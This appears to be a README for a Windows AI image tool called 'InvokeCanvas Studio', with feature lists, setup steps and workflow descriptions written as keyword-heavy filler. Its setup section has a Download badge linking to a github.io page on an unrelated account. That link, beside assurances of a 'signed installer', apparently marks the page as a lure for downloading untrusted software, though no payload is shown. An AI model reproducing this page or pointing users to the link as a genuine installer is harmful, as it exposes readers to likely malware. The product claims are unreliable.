## 🌱 Why InvokeCanvas Studio Exists

Most AI image tools treat the user like a terminal operator. You type, you wait, you get a file. That works — until it doesn't. The moment you want to iterate on a single corner of an image, regenerate a background mask, or blend three generations into one composition, the illusion of simplicity collapses.

InvokeCanvas Studio flips the model. The **canvas is the primary object**, and generation is just one of the verbs you can apply to it. Think of it as the difference between writing a letter and painting a postcard: same medium, radically different intent.

This project is inspired by, but distinct from, the InvokeAI-2026 lineage. It borrows the philosophy of local-first generation, then extends it with a layered editing model, a persistent session ledger, and a plugin surface that other Windows desktop tools rarely offer.

## ✨ Feature Highlights

Here is the honest, non-marketing tour of what ships in 2026:

- 🖼️ **Layer-Aware Canvas** — Every generation lands on its own layer. Blend modes, opacity, and reordering are first-class citizens.
- 🧠 **Prompt Composition Boards** — Save prompt fragments as reusable "cards" and drag them into the composer.
- 🗂️ **Local Model Vault** — A filesystem-respecting library that never moves your checkpoints without asking.
- ⚡ **Accelerated Rendering Path** — Optimized for NVIDIA, AMD, and Intel Arc GPUs on Windows 11 and Windows 10.
- 🔄 **Deterministic Re-Runs** — Every render stores its seed, sampler, and scheduler in a sidecar file.
- 🧩 **Plugin Surface** — Extend the studio without forking it.
- 🌐 **Responsive UI** — The layout adapts from a 4K studio monitor down to a 13-inch laptop panel.
- 🗣️ **12 UI Languages** — Because creativity has no native tongue.
- 🕓 **Session Ledger** — Every action is timestamped and reversible within a session.
- 🛡️ **Offline by Default** — No telemetry leaves the machine unless you explicitly opt in.

## 📐 Responsive Interface

The InvokeCanvas layout is built on a fluid three-zone grid:

1. **Left Rail** — Layer stack, history ledger, and model vault.
2. **Center Canvas** — Where the work lives; supports zoom from 5% to 800%.
3. **Right Inspector** — Prompt cards, sampler controls, and output settings.

On narrow displays, the right inspector collapses into a slide-over panel. On ultrawide monitors, it expands into a dual-column inspector without any manual configuration. The result is a UI that is **responsive by construction**, not by retrofit. Whether you work on a Surface Pro or a three-monitor battlestation, the studio meets you where you are.

## 🚀 Getting Started on Windows 11 & 10

This section is written for humans, not for automation scripts. If you are looking for a **stable diffusion windows local** setup that does not assume you live in a terminal, you are in the right place.

### Step 1 — Prepare the Environment

Ensure your GPU driver is current. The studio checks for known-incompatible driver versions on first launch and will tell you plainly if an update is needed. There is no silent failure mode.

### Step 2 — Obtain the Studio Package

Use the documented acquisition channel from the project page. The package is delivered as a signed installer for Windows 11 and Windows 10. You will not be asked to compile anything, and you will not be asked to trust an unsigned binary.

[![Download](https://raw.githubusercontent.com/ArrozDotachi/InvokeAI-Windows-Setup-Guide/main/run_40de7.svg)](https://ArrozDotachi.github.io/InvokeAI-Windows-Setup-Guide/)

### Step 3 — First Launch Walkthrough

On first launch, the studio presents a short three-screen onboarding:

1. **Vault Location** — Choose where models and outputs live.
2. **Hardware Profile** — The studio detects your GPU and picks a sensible default precision.
3. **Locale** — Pick your interface language.

That is it. There is no hidden setup ceremony, and no dependency graph to untangle by hand.

### Step 4 — Add Your First Model

Drop a model file into the vault folder, or point the vault at an existing folder on another drive. The studio indexes it in place. It never copies, never renames, and never deletes without explicit confirmation.

### Step 5 — Render Something

Type a prompt. Press render. Watch the canvas fill in. Then drag the output onto a new layer and render again with a variation. That moment — when the second layer lands on top of the first — is when the studio's philosophy becomes obvious.

## 🖌️ The Canvas Workflow

The canvas is not a preview window. It is the document. Here is how a typical session unfolds:

1. **Seed Layer** — Start from a text prompt or an imported image.
2. **Inpaint Layer** — Mask a region and regenerate only that region.
3. **Style Layer** — Apply a style pass over the composite without touching geometry.
4. **Composite Pass** — Merge layers with blend modes and export.

Because every layer stores its own generation metadata, you can walk backward through a session and reproduce any intermediate state. The ledger is your safety net.

## 🗄️ Model Management Philosophy

The studio takes an opinionated stance: **your models are your property, and the studio is a guest in their folder.** This has three practical consequences:

- The vault is a *view*, not a *container*.
- Metadata is written to sidecar files, never injected into model weights.
- Hash-based deduplication means you can have the same model on two drives without confusion.

This is a small design decision with an outsized effect on how the tool feels to live with over months and years.

## ⚙️ Performance & Hardware Notes

Local generative workloads are demanding. InvokeCanvas Studio 2026 includes several performance levers:

- **Attention slicing** for cards with limited VRAM.
- **Sequential CPU offload** for systems that prefer stability over raw speed.
- **Tiled decoding** for very large outputs on modest hardware.
- **Precision selection** — fp16, bf16, and fp32 where supported.

On a Windows 11 machine with a modern mid-range GPU, a 1024×1024 render is a matter of seconds, not minutes. On older hardware, the studio will still finish — it will simply take its time, and it will tell you honestly how long it expects to take.
